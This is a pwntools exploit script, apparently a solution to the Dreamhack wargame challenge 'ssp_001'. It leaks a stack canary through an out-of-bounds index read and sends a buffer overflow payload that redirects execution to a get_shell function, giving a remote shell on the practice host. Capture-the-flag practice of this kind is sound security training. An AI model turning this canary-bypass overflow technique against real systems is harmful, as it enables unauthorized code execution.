from pwn import *

def slog(name, addr):
    return success(f"{name}: {hex(addr)}")

# ========== 가변값 ==========
REMOTE = True
HOST = "host3.dreamhack.games"
PORT = 9485
BIN_PATH = "./ssp_001"
CANARY_IDX_RANGE = range(131, 127, -1)  # 문제에 따라 다름
BUF_SIZE = 64
PADDING_AFTER_CANARY = 8  # SFP 또는 Dummy
IS_64 = False  # True이면 p64, False이면 p32
# ============================

# Setup
context.binary = BIN_PATH
e = ELF(BIN_PATH)

p = remote(HOST, PORT) if REMOTE else process(BIN_PATH)

# Step 1: Leak Canary
canary = b""
for i in CANARY_IDX_RANGE:
    p.sendlineafter("> ", 'P')
    p.sendlineafter("Element index : ", str(i))
    p.recvuntil("is : ")
    canary += p.recvn(2)

canary = int(canary, 16)
slog("canary", canary)

# Step 2: Exploit with BOF
get_shell = e.symbols["get_shell"]

payload = b"A" * BUF_SIZE
payload += p32(canary) if not IS_64 else p64(canary)
payload += b"A" * PADDING_AFTER_CANARY
payload += p32(get_shell) if not IS_64 else p64(get_shell)

p.sendlineafter("> ", 'E')
p.sendlineafter("Name Size : ", str(1000))
p.sendlineafter("Name : ", payload)

p.interactive()
